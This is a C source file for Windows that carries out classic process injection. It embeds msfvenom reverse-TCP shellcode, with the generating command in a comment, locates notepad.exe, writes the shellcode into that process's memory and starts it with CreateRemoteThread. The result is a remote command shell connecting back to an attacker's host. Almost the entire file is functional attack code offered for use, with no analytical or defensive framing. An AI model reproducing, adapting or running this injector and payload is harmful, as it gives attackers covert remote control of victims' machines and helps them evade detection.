# include <stdio.h>
# include <windows.h>
# include <string.h>
# include <Tlhelp32.h>
void ErrorMessagess(DWORD status){
    char buffer[256];
    FormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,NULL,status,MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),buffer,sizeof(buffer)/sizeof(char),NULL);
    printf("[+] Error is %s \n", buffer);
}
//chnage the shellcode 
// command used :msfvenom --platform windows -a x64 -p windows/x64/shell_reverse_tcp LHOST=192.168.0.0 LPORT=1234 EXITFUNC=thread -f c
unsigned char buf[] = 
"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
"\x12\xe9\x57\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33"
"\x32\x00\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00"
"\x00\x49\x89\xe5\x49\xbc\x02\x00\x11\x5c\xc0\xa8\xe8\x80"
"\x41\x54\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07"
"\xff\xd5\x4c\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29"
"\x80\x6b\x00\xff\xd5\x50\x50\x4d\x31\xc9\x4d\x31\xc0\x48"
"\xff\xc0\x48\x89\xc2\x48\xff\xc0\x48\x89\xc1\x41\xba\xea"
"\x0f\xdf\xe0\xff\xd5\x48\x89\xc7\x6a\x10\x41\x58\x4c\x89"
"\xe2\x48\x89\xf9\x41\xba\x99\xa5\x74\x61\xff\xd5\x48\x81"
"\xc4\x40\x02\x00\x00\x49\xb8\x63\x6d\x64\x00\x00\x00\x00"
"\x00\x41\x50\x41\x50\x48\x89\xe2\x57\x57\x57\x4d\x31\xc0"
"\x6a\x0d\x59\x41\x50\xe2\xfc\x66\xc7\x44\x24\x54\x01\x01"
"\x48\x8d\x44\x24\x18\xc6\x00\x68\x48\x89\xe6\x56\x50\x41"
"\x50\x41\x50\x41\x50\x49\xff\xc0\x41\x50\x49\xff\xc8\x4d"
"\x89\xc1\x4c\x89\xc1\x41\xba\x79\xcc\x3f\x86\xff\xd5\x48"
"\x31\xd2\x48\xff\xca\x8b\x0e\x41\xba\x08\x87\x1d\x60\xff"
"\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd\x9d\xff\xd5"
"\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
"\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5";

DWORD FindTargetProc( const char *targetprocess){
    HANDLE prcs;
    int flag;
    PROCESSENTRY32 pe32;
    DWORD pid=0;
    prcs=CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);
    if(prcs==INVALID_HANDLE_VALUE){
        printf("[+] Error Occured while Taking Snapshot of the process");
        DWORD dwStatusError=GetLastError();
        ErrorMessagess(dwStatusError);
        exit(0);
    }
    else{
          pe32.dwSize=sizeof(PROCESSENTRY32);
          //retrieving info about the first process
          BOOL values=Process32First(prcs,(LPPROCESSENTRY32)&pe32);
          if(values==FALSE){
             printf("Error Occured while Copying the First Process to buffer");
            DWORD dwStatusError=GetLastError();
            ErrorMessagess(dwStatusError);
            exit(0);
          }
          
          else{
             while(Process32Next(prcs,(LPPROCESSENTRY32)&pe32)){
                int cmp=strcasecmp(targetprocess,pe32.szExeFile);
                if(cmp==0){
                    printf("\n[+] Process found\n");
                    pid=pe32.th32ProcessID;
                    flag=1;
                    break;
                }
                
             }
             if(flag !=1){
                printf("[+] Could not find the process\n");
                exit(0);
             }
          }

    }
    return pid;
}



int main(){

    DWORD ProcessId=FindTargetProc("NoTepad.exe");
    printf("[+] Process ID is %d\n",ProcessId);

    HANDLE prcsID;
    prcsID=OpenProcess(PROCESS_CREATE_THREAD|PROCESS_QUERY_INFORMATION|PROCESS_VM_OPERATION|PROCESS_VM_READ|PROCESS_VM_WRITE,FALSE,ProcessId);
    if(prcsID==NULL){
        printf("[+] Error: Can not create handle to process");
        DWORD dwStatusError=GetLastError();
        ErrorMessagess(dwStatusError);
        exit(0);
    }
    //injecing shellcode into the process
    
    LPVOID addr=NULL;
    DWORD threadid;
    DWORD lpNumberOfBytesWritten;
    HANDLE th;
    addr=VirtualAllocEx(prcsID,NULL,sizeof(buf),MEM_COMMIT | MEM_RESERVE,PAGE_EXECUTE_READ);
 
    if((WriteProcessMemory(prcsID,addr,buf,sizeof(buf),(SIZE_T *)&lpNumberOfBytesWritten)) != 0){
        printf("[+] Data Injected Successfully\n");
        th=CreateRemoteThread(prcsID,NULL,0,addr,NULL,0,NULL);
        if(th==NULL){
            printf("[+] Error :Cannot Create Thread\n");
            DWORD dwStatusError=GetLastError();
            ErrorMessagess(dwStatusError);
            exit(0);
            }
        else {
            printf("[+] Executing Command\n");
            WaitForSingleObject(th,-1);
            CloseHandle(prcsID);
        }
    }
    return 1;
    }
